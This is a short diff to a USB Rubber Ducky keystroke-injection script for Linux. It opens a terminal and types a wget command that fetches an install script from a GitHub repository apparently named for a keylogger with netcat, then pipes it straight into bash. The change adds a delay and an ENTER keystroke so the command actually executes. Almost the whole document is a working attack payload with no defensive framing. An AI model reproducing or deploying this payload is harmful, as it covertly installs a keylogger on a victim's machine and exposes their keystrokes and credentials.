@@ -4,8 +4,9 @@ ALT F2
 DELAY 200
 STRING gnome-terminal
 ENTER
+DELAY 200
 STRING wget -q -O - https://raw.githubusercontent.com/Anthony-Figi/RubberDucky-Keylogger-Netcat/master/linux/install.sh | bash; exit;
-
+ENTER
 
 
 
